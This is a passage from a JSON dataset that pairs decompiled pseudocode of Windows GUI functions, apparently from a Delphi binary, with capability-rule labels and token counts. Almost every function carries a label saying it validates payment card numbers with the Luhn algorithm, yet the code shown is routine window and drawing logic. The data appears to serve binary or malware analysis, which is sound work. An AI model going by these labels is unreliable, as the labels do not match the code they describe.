        "decompiled_code": "\nuint32_t __fastcall fcn.00444464(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.0043df58();\n        uVar1 = fcn.0043df58();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.0043df58();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.0043df58();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.0043df38();\n        uVar1 = fcn.0043df38();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.0043df38();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.0043df38();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 391
    },
    "00444850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00444850(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x444865;\n    cVar1 = fcn.004447f8(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00404620();\n        uStack28 = 0x4448ca;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.004446a8(&stack0xfffffffc);\n        fcn.004446a8(&stack0xfffffffc);\n        fcn.004446a8(&stack0xfffffffc);\n        fcn.004446a8(&stack0xfffffffc);\n        fcn.004446a8(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x4448c9;\n        fcn.00404650();\n        return;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "004454b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004454b4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if ((iVar1 == 0) || (iVar1 == *(*0x49ac1c + 0x30))) {\n        var_4h = 0;\n    }\n    else {\n        func_0x00408290(iVar1, &var_4h);\n    }\n    iVar2 = sub.kernel32.dll_GetCurrentProcessId();\n    if (iVar2 == var_4h) {\n        iVar2 = fcn.00419910();\n        if (iVar2 < 0) {\n            fcn.0041975c();\n        }\n    }\n    if ((((iVar1 != 0) && (arg_8h != *(*0x49ac1c + 0x30))) && (iVar1 == *(*0x49ac1c + 0x30))) && (arg_8h != arg_ch)) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0040676c();\n            fcn.00406928(iVar1 + 1);\n            iVar1 = fcn.0040676c();\n            *(*0x49ac40 + -4 + iVar1 * 4) = arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 345
    },
    "0044581c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044581c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.00445f10();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 134
    },
    "00446290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446290(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x4462bb;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    puStack28 = 0x4462ea;\n                    cVar1 = fcn.0044d2ec();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iStack24 = iVar2;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x4462d7;\n                iVar2 = fcn.00458594();\n            }\n            puStack28 = iVar2;\n            iVar3 = sub.user32.dll_IsWindowUnicode();\n            if (iVar3 == 0) {\n                iVar2 = func_0x00408418(iVar2, param_2[1] + 0xbc00, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageW();\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            func_0x00408290(iVar2);\n            uVar5 = *(in_EAX + 0x30);\n            func_0x00408290(uVar5, &stack0xffffffe4);\n            if (iStack24 == iStack20) {\n                puStack28 = param_2[3];\n                iStack24 = iVar2;\n                iVar2 = sub.user32.dll_SendMessageA(uVar5, param_2[1] + 0xbc00, param_2[2]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, uVar4);\n}\n",
        "token_count": 634
    },
    "004465d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004465d4(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.004464c0();\n    if (cVar1 == '\\0') {\n        fcn.00446e78();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004466e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004466e4(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint8_t uStack520;\n    \n    uVar1 = fcn.00404528();\n    while (uVar2 = uVar1,  uVar1 != 0) {\n        fcn.00404530();\n        fcn.00404530();\n        bVar3 = uStack520 == 0xffffffff;\n        uVar2 = fcn.00403a4c();\n        if (bVar3) break;\n        uVar1 = fcn.004045dc();\n    }\n    return uVar2 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 162
    },
    "00446dec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00446dec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.0044eda8();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00447394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00447394(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.0044724c();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.004476e0();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.004473cc();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00448004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00448004(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x28) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 236
    },
    "004485e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.004485e4(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x4485f5;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x448685;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.0042a570();\n    fcn.0042995c();\n    fcn.00424f64();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.004485e4::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00418464(arg_8h, arg_ch);\n    fcn.0042995c(&fcn.004485e4::var_18h);\n    fcn.00425308();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x44868c);\n    return;\n}\n",
        "token_count": 388
    },
    "004486a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004486a8(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.004485e4();\n    return;\n}\n",
        "token_count": 159
    },
    "00448848": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00448848(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x448863;\n    fcn.00429388();\n    uStack36 = 0x4488f7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x448880;\n    puStack32 = &stack0xfffffffc;\n    fcn.00429388();\n    uStack48 = 0x4488da;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.004485d8();\n    uVar1 = fcn.0044871c();\n    uVar2 = fcn.0044871c(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x4488e1);\n    return;\n}\n",
        "token_count": 333
    },
    "00449144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00449144(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x44915c;\n        iVar1 = fcn.00448914();\n        puStack32 = 0x449165;\n        iVar2 = fcn.00448914();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x449179;\n            iVar1 = fcn.00448914();\n            if (iVar1 != 0) {\ncode_r0x00449191:\n                puStack32 = 0x44919d;\n                fcn.00404620();\n                uStack36 = 0x449220;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x4491b8;\n                puStack32 = &fcn.00449144::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x4491c4;\n                fcn.00404620();\n                uStack48 = 0x449203;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00449144::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.00449100();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x44920a;\n                uStack48 = 0x449202;\n                uVar3 = fcn.00404650();\n                return uVar3;\n            }\n            puStack32 = 0x449184;\n            iVar1 = fcn.00448914();\n            if (iVar1 != 0) goto code_r0x00449191;\n            var_1h._0_1_ = 1;\n            goto code_r0x00449227;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00449227:\n    return var_1h;\n}\n",
        "token_count": 611
    },
    "00449290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449290(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00420300();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.00449234(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 160
    },
    "0044957c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044957c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x44959b;\n    iVar1 = fcn.00420a8c(0);\n    uStackY44 = 0x4495dc;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.004486e0();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x4495e3;\n    iStackY48 = 0x4495db;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 240
    },
    "0044a154": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a154(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0044a594": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044a594(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00420894();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "0044d14c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044d14c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x493650 + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x493650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x493650 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x49ac72, *0x493650);\n    sub.user32.dll_SetPropA(arg_8h, *0x49ac70, *0x493650);\n    iVar1 = *0x493650;\n    *0x493650 = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 505
    },
    "0044d588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d588(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.00451ae8(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 196
    },
    "0044d714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044d714(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402f00();\n    *puVar2 = param_2;\n    uVar3 = fcn.0044d6e8(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0044d6b0();\n    if (cVar1 == '\\0') {\n        fcn.0041975c();\n    }\n    else {\n        fcn.004198b4();\n        uVar3 = fcn.00458594();\n        uVar3 = fcn.00458594(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.00419930();\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0044da94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044da94(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0044eda8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0044eda8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x44edbc;\n    iVar1 = fcn.0044ed74();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.00450370();\n        iVar2 = fcn.004553cc(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 167
    },
    "0044ee3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044ee3c(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 39
    },
    "0044ee6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044ee6c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x44ee7c;\n    var_8h = fcn.00419c24();\n    uStack28 = 0x44ef1c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x44eeae;\n            var_10h = fcn.004198b4();\n            puStack36 = 0x44eeb9;\n            cVar1 = fcn.00425558();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x44eef5;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0044f0a8();\n                fcn.00404f70();\n                fcn.00404f70();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x44ef23;\n    uStack28 = 0x44ef1b;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 442
    },
    "0044f120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044f120(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0044f790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044f790(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404a1c();\n    fcn.004451f8();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.00420284();\n        fcn.00451ae8(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.00450150();\n        fcn.0040484c();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00404650();\n    arg_8h[0x1b] = 0;\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040ab10();\n    fcn.00404650();\n    fcn.0041ffbc();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00450150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450150(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 128
    },
    "004501ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004501ac(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 47
    },
    "004501c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004501c4(void)\n\n{\n    fcn.004501f0();\n    fcn.00418428();\n    fcn.004506bc();\n    return;\n}\n",
        "token_count": 41
    },
    "004501f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004501f0(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "00450208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00450208(void)\n\n{\n    fcn.004501ac();\n    fcn.00418428();\n    fcn.004506bc();\n    return;\n}\n",
        "token_count": 39
    },
    "004502c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004502c0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "00450370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450370(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 104
    },
    "004506bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
